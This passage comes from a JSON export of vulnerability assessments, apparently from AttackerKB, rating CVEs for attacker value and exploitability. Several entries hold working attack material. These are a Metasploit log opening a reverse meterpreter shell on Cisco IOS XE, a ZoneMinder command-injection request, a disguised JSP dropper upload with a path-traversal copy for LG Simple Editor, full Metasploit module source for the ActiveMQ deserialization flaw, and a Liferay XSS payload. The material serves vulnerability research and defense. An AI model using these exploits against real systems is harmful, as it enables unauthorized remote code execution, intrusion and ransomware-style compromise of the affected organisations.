      "document": "On November 8, 2023, SysAid, an IT service management company, revealed a zero-day path traversal vulnerability, CVE-2023-47426, impacting on-premise SysAid servers. Microsoft's threat intelligence team, the discoverers of this vulnerability, reported its exploitation in the wild by DEV-0950 (Lace Tempest) through \"limited attacks.\" \r\n\r\nMicrosoft, in a social media thread on the evening of November 8, underscored that Lace Tempest is associated with the distribution of Cl0p ransomware and highlighted the likelihood of ransomware deployment and/or data exfiltration when exploiting CVE-2023-47246. It's worth noting that Lace Tempest was also responsible for the MOVEit Transfer and GoAnywhere MFT extortion attacks earlier this year.",
      "score": 2,
      "metadata": {
        "mitre-tactics": "Initial Access",
        "attacker-value": 5,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "def6357c-0771-400a-909d-2021d9f6b227",
          "name": "Observed in ransomware attacks",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "observed_in_ransomware"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        }
      ]
    },
    {
      "id": "f98477ad-cce0-4c2f-88de-0febfd7a37b2",
      "editorId": "d603b493-1c7b-4ee8-972f-185269cce6d3",
      "topicId": "6e45e319-83ea-4601-bb94-ead8974b7a39",
      "created": "2023-11-10T10:08:01.536855Z",
      "revisionDate": "2023-11-10T14:47:04.794733Z",
      "document": "While this vulnerability requires authentication, it can be chained with [CVE-2023-20198](https://attackerkb.com/topics/oMQ7Xa0F51/cve-2023-20198) to achieve unauthenticated RCE on the target, as shown via the Metasploit exploit:\r\n\r\n```\r\nmsf6 exploit(linux/misc/cisco_ios_xe_rce) > set payload cmd/linux/http/x64/meterpreter/reverse_tcp\r\npayload => cmd/linux/http/x64/meterpreter/reverse_tcp\r\nmsf6 exploit(linux/misc/cisco_ios_xe_rce) > exploit\r\n\r\n[*] Started reverse TCP handler on 192.168.86.42:4444 \r\n[*] Running automatic check (\"set AutoCheck false\" to disable)\r\n[+] The target is vulnerable. Cisco IOS XE Software, Version 17.03.02\r\n[*] Created privilege 15 user 'sqVXixoV' with password 'ZiPbsXBu'\r\n[*] Removing user 'sqVXixoV'\r\n[*] Sending stage (3045380 bytes) to 192.168.86.58\r\n[*] Meterpreter session 6 opened (192.168.86.42:4444 -> 192.168.86.58:64970) at 2023-11-06 17:01:06 +0000\r\n\r\nmeterpreter > getuid\r\nServer username: root\r\nmeterpreter > sysinfo\r\nComputer     : router\r\nOS           :  (Linux 4.19.106)\r\nArchitecture : x64\r\nBuildTuple   : x86_64-linux-musl\r\nMeterpreter  : x64/linux\r\nmeterpreter >\r\n```\r\n\r\nI have marked the exploitability for this vulnerability as High, as the vulnerable Web UI component may not be enabled by default. The attacker value for this vulnerability is Very High, given the target devices running IOS XE are enterprise routers/switches/access points.",
      "score": 2,
      "metadata": {
        "attacker-value": 5,
        "exploitability": 4
      },
      "tags": []
    },
    {
      "id": "7077c081-24c0-4001-b20f-036b1f5ffbc4",
      "editorId": "d603b493-1c7b-4ee8-972f-185269cce6d3",
      "topicId": "e19696ef-5d4b-4b1c-b332-a20d5e9f82a2",
      "created": "2023-11-10T14:09:14.615196Z",
      "revisionDate": "2023-11-10T14:38:35.13112Z",
      "document": "Based on performing an [analysis](https://attackerkb.com/topics/UPt5tpYK2Y/cve-2023-38548/rapid7-analysis) of this vulnerability, I set the attacker value of this to Medium, as while we can leak a NTLM hash, it may not be feasible to either crack the hash if the password is a complex value, and it may not be feasible to pass-the-hash if their is no suitable target service the attacker can leverage for a pass-the-hash attack. The exploitability of this vulnerability is Very High, as it is unauthenticated and trivial to perform.",
      "score": 1,
      "metadata": {
        "attacker-value": 3,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "10760578-fb95-4fd0-8b3c-2162ec8cc1a2",
      "editorId": "de2686f1-1a8a-4518-8379-12188d859523",
      "topicId": "492a70b3-eafa-49ac-8490-e16fa25b7b2d",
      "created": "2023-11-13T18:52:10.946219Z",
      "revisionDate": "2023-11-13T18:52:10.945806Z",
      "document": "ZoneMinder is a free, open source Closed-circuit television software application. At the time of writing there appears to be just over 3200 identifiable instances listening on the internet according to the following crude Shodan query:\r\n```\r\nshodan count \"http.html:\\\"<title>ZM - Login</title>\\\" http.html:\\\"/zm/\\\"\"\r\n3237\r\n```\r\n\r\nZoneMinder prior to the versions listed below suffer from an unauthenticated remote code execution vulnerability in default configuration. The vulnerability is trivial to execute and provides a valuable entry point for attackers. \r\n\r\n# Vulnerable Versions\r\nPrior to 1.36.33 \r\nPrior to 1.37.33\r\n\r\n# How it works\r\n\r\nBy default on affected versions unauthenticated users can access the create snapshot action when accessing the following endpoint `/zm/index.php`. The following is an excerpt from [snapshot.php](https://github.com/ZoneMinder/zoneminder/blob/master/web/includes/actions/snapshot.php) \r\n```\r\nif ( $action == 'create' ) {\r\n  if ( ! (isset($_REQUEST['monitor_ids']) and count($_REQUEST['monitor_ids']) > 0 ) ) {\r\n    ZM\\Error('No monitor ids given in snapshot creation request');\r\n    return;\r\n  }\r\n  $snapshot = new ZM\\Snapshot();\r\n```\r\n\r\nThe snapshot action expects a `monitor_id` in order to fetch an existing monitor, however you can pass an object in order to create a new monitor instead (we will actually pass in a malicious payload here). Soon after the method `TriggerOn();` is called in order to retrieve an event_id:\r\n```\r\n    $event_id = $monitor->TriggerOn();\r\n    ZM\\Debug(\"Have event $event_id for monitor $monitor_id\");\r\n```\r\n`TriggerOn()` immediately calls the `function AlarmCommand($cmd) `:\r\n```\r\n  function TriggerOn() {\r\n    $output = $this->AlarmCommand('on');\r\n```\r\nInside `AlarmCommand` a call to `shell_exec` is made and it appends the `monitor_id` we sent earlier without applying any sanitization to the parameter:\r\n```\r\n      $cmd = getZmuCommand($cmd.' -m '.validCardinal($this->{'Id'}));\r\n      $output = shell_exec($cmd);\r\n```\r\n\r\n## Exploiting the vuln.\r\nNote that in order to exploit this vulnerability you have to first grab a csrf-token from the response body of a request to `/zm/index.php`:\r\n```\r\n<div class=\"container\">\r\n\t\t<form class=\"center-block\" name=\"loginForm\" id=\"loginForm\" method=\"post\" action=\"?view=login\"><input type='hidden' name='__csrf_magic' value=\"key:1b3da97bd640e57e0ce5dc6f5a09e7a1a9368004,1699900789\" />\r\n\t\t\t<input type=\"hidden\" name=\"action\" value=\"login\"/>\r\n      <input type=\"hidden\" name=\"postLoginQuery\" value=\"\" />\r\n``` \r\nIn the above example the token is `1b3da97bd640e57e0ce5dc6f5a09e7a1a9368004,1699900789`. With that information you can then send the following post request to a vulnerable target in order to write a file to the temp directory:\r\n```\r\nPOST /zm/index.php HTTP/1.1\r\nHost: 192.168.65.2\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36 Edg/117.0.2045.47\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 268\r\n\r\nview=snapshot&action=create&monitor_ids[0][Id]=;touch%20/tmp/pwnd&__csrf_magic=key:1b3da97bd640e57e0ce5dc6f5a09e7a1a9368004,1699900789\r\n```\r\nIf you want to shell, edit the post request or use the metasploit module: `unix/webapp/zoneminder_snapshots`\r\n\r\n## References\r\nhttps://github.com/ZoneMinder/zoneminder/security/advisories/GHSA-72rg-h4vf-29gr\r\n",
      "score": 1,
      "metadata": {
        "mitre-tactics": "Execution",
        "attacker-value": 4,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "fb1c8b41-645f-47f8-864e-e926e13560ab",
      "editorId": "de2686f1-1a8a-4518-8379-12188d859523",
      "topicId": "14b49a3d-1c92-4966-90de-b97cf7c69fb1",
      "created": "2023-11-13T19:43:04.963452Z",
      "revisionDate": "2023-11-13T19:43:04.962469Z",
      "document": "LG Simple Editor is a solution that enables you to create and distribute content easily and quickly by using templates. LG Simple Editor is recommended for small businesses and sports bars which require simple content display or play-on-air via their signage. It enables easy new content creation by simplifying processes, and immediate playback on signage. Version prior to `v3.21` suffer from two vulnerability specifically a broken access control and directory traversal that result in remote code execution in the context of `NT AUTHORITY \\SYSTEM`\r\n\r\n# Vulnerable Versions\r\n- <= v3.21\r\n\r\n# Attacker Value & Exploitability\r\nThis exploit scores 5/5 in both categories primarily due to the fact the exploit provides unauthenticated remote code execution in the context of `NT AUTHORITY \\SYSTEM`. Other contributing factors are of course how it is vulnerable straight out of the box and how easy it is to exploit. It might not be as common in enterprise by nature of the product description above however I don\u2019t think that should affect either of these ratings. \r\n\r\n# How it works\r\n\r\nFirst start by exploiting the broken access control vulnerability (which at the time of writing does not have a CVE - it could be considered a feature). The endpoint `/simpleeditor/imageManager/uploadImage.do` will allow you to upload a file with the `.bmp` file extension of which the contents are not inspected thoroughly. In order to obtain remote code execution we can upload a malicious `.jsp` under the disguise of a `.bmp` file extension.  The following `.jsp` payload (used by the metasploit module `windows/http/lg_simple_editor_rce`) first base64 decodes the raw bytes of a malicious executable, then writes the executable to a file, then runs the executable with `Runtime.getRuntime().exe`.\r\n```\r\nPOST /simpleeditor/imageManager/uploadImage.do HTTP/1.1\r\nHost: 127.0.0.1:8080\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36 Edg/117.0.2045.47\r\nContent-Type: multipart/form-data; boundary=---------------------------761960311879735919883545313592\r\nContent-Length: 99894\r\n\r\n-----------------------------761960311879735919883545313592\r\nContent-Disposition: form-data; name=\"uploadFile\"; filename=\"SyouN.bmp\"\r\nContent-Type: image/bmp\r\nContent-Transfer-Encoding: binary\r\n\r\n    <%@page import=\"java.io.*\" %>    <%@page import=\"sun.misc.BASE64Decoder\"%>    <%    try {      String cXaet = \"\r\n\r\n    <<binary payload base64 encoded>> \r\n\r\n    \";      BASE64Decoder dHhlo = new BASE64Decoder();      byte[] aHZZzH = dHhlo.decodeBuffer(cXaet.toString());      File eplNCoYo = File.createTempFile(\"OXvZEnQ\", \".exe\");      String fbhUvbGUQZA = eplNCoYo.getAbsolutePath();      BufferedOutputStream bghnAwAsukY =        new BufferedOutputStream(new FileOutputStream(fbhUvbGUQZA));      bghnAwAsukY.write(aHZZzH);      bghnAwAsukY.close();      Process eVsTEolPjY = Runtime.getRuntime().exec(fbhUvbGUQZA);    } catch (Exception e) {    }    %>\r\n-----------------------------761960311879735919883545313592\r\nContent-Disposition: form-data; name=\"uploadPath\"\r\n\r\n/\r\n-----------------------------761960311879735919883545313592\r\nContent-Disposition: form-data; name=\"uploadFile_x\"\r\n\r\n-1000\r\n-----------------------------761960311879735919883545313592\r\nContent-Disposition: form-data; name=\"uploadFile_y\"\r\n\r\n-1000\r\n-----------------------------761960311879735919883545313592\r\nContent-Disposition: form-data; name=\"uploadFile_width\"\r\n\r\n1920\r\n-----------------------------761960311879735919883545313592\r\nContent-Disposition: form-data; name=\"uploadFile_height\"\r\n\r\n1080\r\n-----------------------------761960311879735919883545313592--\r\n```\r\n\r\nNow we can exploit the vulnerability that is tied to CVE-2023-40498. The `/simpleeditor/fileSystem/makeDetailContent.do` endpoint allows unauthenticated users to copy files on the filesystem with no directory traversal mitigations in place. So we can copy our malicious `.bmp` file to a file with the extension `.jsp` so we can execute it (ezpz some might say).  This can be achieved by issuing the following POST request:\r\n```\r\nPOST /simpleeditor/fileSystem/makeDetailContent.do HTTP/1.1\r\nHost: 127.0.0.1:8080\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36 Edg/117.0.2045.47\r\nX-Requested-With: XMLHttpRequest\r\nAccept: application/json\r\nContent-Type: application/json\r\nContent-Length: 86\r\n\r\n{\"command\":\"cp\",\"option\":\"-f\",\"srcPath\":\"/SyouN_original.bmp\",\"destPath\":\"/SyouN.jsp\"}\r\n```\r\n\r\nThe payload we uploaded is now in an executable file format in a directory accessible without authentication. \r\n",
      "score": 1,
      "metadata": {
        "mitre-tactics": "Execution",
        "attacker-value": 5,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "85f9fc20-8085-4a47-85ed-0a78e93554c2",
      "editorId": "ec1e1a37-816f-484a-94e5-ce9baef45cc8",
      "topicId": "9ab03e2e-596c-490f-8dcb-1a41d344a5ad",
      "created": "2023-11-16T17:29:06.100721Z",
      "revisionDate": "2023-11-16T17:29:06.099903Z",
      "document": "",
      "score": 1,
      "metadata": {
        "mitre-tactics": "Privilege Escalation",
        "attacker-value": 4,
        "exploitability": 3
      },
      "tags": [
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "c3f3e58c-8bbd-4535-85db-f20c831627fb",
      "editorId": "198da8db-21b5-4678-a70d-51ae5c950847",
      "topicId": "fa462bf2-4fb6-4fd0-96f0-cee042e36717",
      "created": "2023-11-16T18:45:53.222785Z",
      "revisionDate": "2024-02-01T15:07:58.599957Z",
      "document": "More about:\r\nUnderstanding ***deserialization***\r\n[Learn](https://portswigger.net/web-security/deserialization)\r\n\r\n### Exploit\r\n```xml\r\n##\r\n# This module requires Metasploit: https://metasploit.com/download\r\n# Current source: https://github.com/rapid7/metasploit-framework\r\n##\r\n\r\nclass MetasploitModule < Msf::Exploit::Remote\r\n  Rank = ExcellentRanking\r\n\r\n  prepend Msf::Exploit::Remote::AutoCheck\r\n  include Msf::Exploit::Remote::HttpServer\r\n  include Msf::Exploit::Remote::Tcp\r\n  include Msf::Exploit::Retry\r\n\r\n  def initialize(info = {})\r\n    super(\r\n      update_info(\r\n        info,\r\n        'Name' => 'Apache ActiveMQ Unauthenticated Remote Code Execution',\r\n        'Description' => %q{\r\n          This module exploits a deserialization vulnerability in the OpenWire transport unmarshaller in Apache\r\n          ActiveMQ. Affected versions include 5.18.0 through to 5.18.2, 5.17.0 through to 5.17.5, 5.16.0 through to\r\n          5.16.6, and all versions before 5.15.16.\r\n        },\r\n        'License' => MSF_LICENSE,\r\n        'Author' => [\r\n          'X1r0z', # Original technical analysis & exploit\r\n          'sfewer-r7', # MSF exploit & Rapid7 analysis\r\n          'nu11secur1ty', # automated EXPLOIT-developer for MetaSploit m0r3: https://github.com/nu11secur1ty/metasploit-framework-nu11secur1ty/tree/main/automation\r\n        ],\r\n        'References' => [\r\n          ['CVE', '2023-46604'],\r\n          ['URL', 'https://github.com/X1r0z/ActiveMQ-RCE'],\r\n          ['URL', 'https://exp10it.cn/2023/10/apache-activemq-%E7%89%88%E6%9C%AC-5.18.3-rce-%E5%88%86%E6%9E%90/'],\r\n          ['URL', 'https://attackerkb.com/topics/IHsgZDE3tS/cve-2023-46604/rapid7-analysis'],\r\n          ['URL', 'https://activemq.apache.org/security-advisories.data/CVE-2023-46604-announcement.txt']\r\n        ],\r\n        'DisclosureDate' => '2023-10-27',\r\n        'Privileged' => false,\r\n        'Platform' => %w[win linux unix],\r\n        'Arch' => [ARCH_CMD],\r\n        # The Msf::Exploit::Remote::HttpServer mixin will bring in Exploit::Remote::SocketServer, this will set the\r\n        # Stance to passive, which is unexpected and results in the exploit running as a background job, as RunAsJob will\r\n        # be set to true. To avoid this happening, we explicitly set the Stance to Aggressive.\r\n        'Stance' => Stance::Aggressive,\r\n        'Targets' => [\r\n          [\r\n            'Windows',\r\n            {\r\n              'Platform' => 'win'\r\n            }\r\n          ],\r\n          [\r\n            'Linux',\r\n            {\r\n              'Platform' => 'linux'\r\n            }\r\n          ],\r\n          [\r\n            'Unix',\r\n            {\r\n              'Platform' => 'unix'\r\n            }\r\n          ]\r\n        ],\r\n        'DefaultTarget' => 0,\r\n        'DefaultOptions' => {\r\n          # By default ActiveMQ listens for OpenWire requests on TCP port 61616.\r\n          'RPORT' => 61616,\r\n          # The maximum time in seconds to wait for a session.\r\n          'WfsDelay' => 30\r\n        },\r\n        'Notes' => {\r\n          'Stability' => [CRASH_SAFE],\r\n          'Reliability' => [REPEATABLE_SESSION],\r\n          'SideEffects' => [IOC_IN_LOGS]\r\n        }\r\n      )\r\n    )\r\n  end\r\n\r\n  def check\r\n    connect\r\n\r\n    res = sock.get_once\r\n\r\n    disconnect\r\n\r\n    return CheckCode::Unknown unless res\r\n\r\n    len, _, magic = res.unpack('NCZ*')\r\n\r\n    return CheckCode::Unknown unless res.length == len + 4\r\n\r\n    return CheckCode::Unknown unless magic == 'ActiveMQ'\r\n\r\n    return CheckCode::Detected unless res =~ /ProviderVersion...(\\d+\\.\\d+\\.\\d+)/\r\n\r\n    version = Rex::Version.new(::Regexp.last_match(1))\r\n\r\n    ranges = [\r\n      ['5.18.0', '5.18.2'],\r\n      ['5.17.0', '5.17.5'],\r\n      ['5.16.0', '5.16.6'],\r\n      ['0.0.0', '5.15.15']\r\n    ]\r\n\r\n    ranges.each do |min, max|\r\n      if version.between?(Rex::Version.new(min), Rex::Version.new(max))\r\n        return Exploit::CheckCode::Appears(\"Apache ActiveMQ #{version}\")\r\n      end\r\n    end\r\n\r\n    Exploit::CheckCode::Safe(\"Apache ActiveMQ #{version}\")\r\n  end\r\n\r\n  def exploit\r\n    # The payload is send in a CDATA section of an XML file. Therefore, the payload cannot contain a CDATA closing tag.\r\n    if payload.encoded.include? ']]>'\r\n      fail_with(Failure::BadConfig, 'The encoded payload data may not contain the CDATA closing tag ]]>')\r\n    end\r\n\r\n    start_service\r\n\r\n    connect\r\n\r\n    # The vulnerability allows us to instantiate an arbitrary class, with a single arbitrary string parameter. To\r\n    # leverage this we can use ClassPathXmlApplicationContext, and pass a URL to an XML configuration file we\r\n    # serve. This XML file allows us to create arbitrary classes, and call arbitrary methods. This is leveraged to\r\n    # run an attacker supplied command line via java.lang.ProcessBuilder.start.\r\n    clazz = 'org.springframework.context.support.ClassPathXmlApplicationContext'\r\n\r\n    # 31 is the EXCEPTION_RESPONSE data type.\r\n    data = [31].pack('C')\r\n    # ResponseMarshaller.looseUnmarshal reads a 4 byte int for the command id.\r\n    data << [0].pack('N')\r\n    # and a 1 byte boolean for response required.\r\n    data << [0].pack('C')\r\n    # ResponseMarshaller.looseUnmarshal read a 4 byte int for the correlation ID.\r\n    data << [0].pack('N')\r\n    # BaseDataStreamMarshaller.looseUnmarsalThrowable wants a boolean true to continue to unmarshall.\r\n    data << [1].pack('C')\r\n    # BaseDataStreamMarshaller.looseUnmarshalString reads a byte boolean and if true, reads a UTF-8 string.\r\n    data << [1].pack('C')\r\n    # First 2 bytes are the length.\r\n    data << [clazz.length].pack('n')\r\n    # Then the string data. This is the class name to instantiate.\r\n    data << clazz\r\n    # Same again for the method string. This is the single string parameter used during class instantiation.\r\n    data << [1].pack('C')\r\n    data << [get_uri.length].pack('n')\r\n    data << get_uri\r\n\r\n    sock.puts([data.length].pack('N') + data)\r\n\r\n    retry_until_truthy(timeout: datastore['WfsDelay']) do\r\n      !handler_enabled? || session_created?\r\n    end\r\n\r\n    handler\r\n  ensure\r\n    cleanup\r\n  end\r\n\r\n  def on_request_uri(cli, request)\r\n    if request.uri != get_resource\r\n      super\r\n    end\r\n\r\n    case target['Platform']\r\n    when 'win'\r\n      shell = 'cmd.exe'\r\n      flag = '/c'\r\n    when 'linux', 'unix'\r\n      shell = '/bin/sh'\r\n      flag = '-c'\r\n    end\r\n\r\n    xml = %(<?xml version=\"1.0\" encoding=\"UTF-8\"?>\r\n<beans xmlns=\"http://www.springframework.org/schema/beans\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xsi:schemaLocation=\"http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd\">\r\n<bean id=\"#{Rex::Text.rand_text_alpha(8)}\" class=\"java.lang.ProcessBuilder\" init-method=\"start\">\r\n  <constructor-arg>\r\n    <list>\r\n      <value>#{shell}</value>\r\n      <value>#{flag}</value>\r\n      <value><![CDATA[#{payload.encoded}]]></value>\r\n    </list>\r\n  </constructor-arg>\r\n</bean>\r\n</beans>)\r\n\r\n    send_response(cli, xml, {\r\n      'Content-Type' => 'application/xml',\r\n      'Connection' => 'close',\r\n      'Pragma' => 'no-cache'\r\n    })\r\n\r\n    print_status('Sent ClassPathXmlApplicationContext configuration file.')\r\n  end\r\n\r\nend\r\n```\r\n\r\n# Details:\r\n[href](https://www.rapid7.com/blog/post/2023/11/01/etr-suspected-exploitation-of-apache-activemq-cve-2023-46604/)\r\n\r\nFull unlocked video:\r\n[Exploit demo, automated by @nu11secur1ty](https://www.youtube.com/watch?v=lZM-ssEIQXo)\r\n\r\nBR @nu11secur1ty ",
      "score": 0,
      "metadata": {
        "mitre-tactics": "Execution",
        "attacker-value": 4,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        },
        {
          "id": "795f5056-8a39-4610-912c-c033bd6fd4cb",
          "name": "Vulnerable in uncommon configuration",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "obscure_configuration"
        }
      ]
    },
    {
      "id": "999db233-d77c-4c80-91c9-ce433c597f52",
      "editorId": "0be71146-555c-4155-9c6b-308a447b1ca0",
      "topicId": "d9703021-cbb6-49f4-a180-2a9c8f5ff7dc",
      "created": "2023-11-22T15:56:48.099561Z",
      "revisionDate": "2023-11-22T15:56:48.099121Z",
      "document": "As of 2023-11-22, this vulnerability is still in reserved status in MITRE and is not exploited in the wild. The EITW report here: https://cybersecurityworks.com/howdymanage/uploads/file/Ransomware%20Report%202023_compressed.pdf is a typo of CVE-2022-26134 (a widely exploited and discussed confluence vuln).",
      "score": 1,
      "metadata": {},
      "tags": []
    },
    {
      "id": "0754ed85-ec72-4fa6-8359-af754b527822",
      "editorId": "41ee63b8-9004-4ed1-aff0-641a222c6ba0",
      "topicId": "a5513616-cac5-4119-b695-d5232a491563",
      "created": "2023-11-28T17:10:18.686107Z",
      "revisionDate": "2023-11-28T17:16:36.889196Z",
      "document": "Simple to resolve Upgrade Ubuntu:23.10 thunderbird to version 1:115.5.0+build1-0ubuntu0.23.10.1 or higher.. \r\n\r\nAlso looking at the code, there doesn't seem to be any reason why gPropertiesFile can't be:\r\n\r\nstatic const char* gPropertiesFile[nsContentUtils::PropertiesFile[COUNT]\r\nThe CreateBundle method each of those strings is passed to expects a const char* with no hard-coded expectation of length. It's static so the symbol can't be resolved outside this cpp. Also, fwiw the new max length string in that array is 75, not 78 (including null-terminator).\r\n\r\nWhy is the setting to enable 2 rather than 1?\r\n\r\nApart from that it looks fine to me.",
      "score": 1,
      "metadata": {
        "mitre-tactics": "Persistence",
        "attacker-value": 2,
        "exploitability": 4
      },
      "tags": [
        {
          "id": "791283de-d643-4ede-850e-91a6edb897db",
          "name": "Exploited in the wild",
          "type": "exploited_in_the_wild",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "exploited_in_the_wild"
        },
        {
          "id": "991a0301-5049-4e43-86af-feec9914e03a",
          "name": "Observed in State-sponsored attacks",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "observed_in_state_sponsored_attacks"
        },
        {
          "id": "def6357c-0771-400a-909d-2021d9f6b227",
          "name": "Observed in ransomware attacks",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "observed_in_ransomware"
        },
        {
          "id": "3e5a47c9-35b0-4d55-92e4-0e83e6cbb2ec",
          "name": "Difficult to weaponize",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "difficult_to_develop"
        },
        {
          "id": "0e696d6d-665a-48bd-9636-06d0a3a2a211",
          "name": "Requires elevated access",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "requires_elevated_access"
        }
      ]
    },
    {
      "id": "0bd369f7-33a1-4b2f-8c37-b162c7bcf31d",
      "editorId": "38346220-4c55-4428-af6f-466a697194f3",
      "topicId": "2890f503-c00e-4eda-a247-785e61224a3a",
      "created": "2023-11-29T10:20:25.972895Z",
      "revisionDate": "2023-12-04T10:22:19.698305Z",
      "document": "Additional information added by the discoverer at https://liferay.atlassian.net/browse/LPE-17022\r\n\r\n*Steps to reproduce:* \r\n\r\n1. Create a Web Content Folder Folder1\r\n2. Configure Folder1 with Workflow Single Approver\r\n3. Create a Web Content WC1 in Folder1\r\n4. Go to Notifications\r\n5. Copy the link of the new notification.\r\n6. Replace the value of the redirect parameter with http%3A%2F%2Fwww.liferay.com \r\n\r\n*Expected result:*\r\n\r\n- The user is not redirected to a page within [https://www.liferay.com|https://www.liferay.com/]\r\n\r\n*Actual result:*\r\n\r\n- The user is redirected to a page with [https://www.liferay.com|https://www.liferay.com/]",
      "score": 2,
      "metadata": {
        "attacker-value": 2
      },
      "tags": []
    },
    {
      "id": "699ff2d8-b041-401c-bdf0-aa108243efce",
      "editorId": "38346220-4c55-4428-af6f-466a697194f3",
      "topicId": "7e273bc7-6d97-494b-9d33-e47a112a2d91",
      "created": "2023-11-29T10:25:22.730318Z",
      "revisionDate": "2023-12-04T10:22:13.980174Z",
      "document": "Additional information by the reporter at https://liferay.atlassian.net/browse/LPE-17093\r\n\r\n*Steps to reproduce* \r\n\r\n1. Start vanilla 7.0.x/7.1x/7.2.x\r\n2. create a site team with title: `<b onmouseover=alert(document.location)>Test</b>`\r\n3. Click into the Team\r\n4. click + to add new member\r\n5. In the popup, hover onto 'Test' in the title: \"Add New User to Test\" \r\n\r\nActual result: XSS popup\r\n\r\nExpected: no XSS\r\n\r\n*Reproduced on:* (x) 7.0.x Commit: f0ea5eb8945bd8bd20736d6aff0a5a6e748f5051 (x) 7.2.x Commit: [774c13baf1149336f7011318c0766e1dd0c4270f|https://github.com/liferay/liferay-portal/commit/774c13baf1149336f7011318c0766e1dd0c4270f] (/) master private Commit: c379f2a0f2204cf2ded7688e367ef69d72919485",
      "score": 2,
      "metadata": {
        "attacker-value": 2
      },
      "tags": []
    },
    {
      "id": "a2b1b41a-0a26-4226-a53b-ae72e6c65107",
      "editorId": "d603b493-1c7b-4ee8-972f-185269cce6d3",
      "topicId": "05296d7c-48b7-4bc0-868e-a4dd2b794d30",
      "created": "2023-11-29T16:32:13.057215Z",
      "revisionDate": "2023-12-06T21:17:25.75265Z",
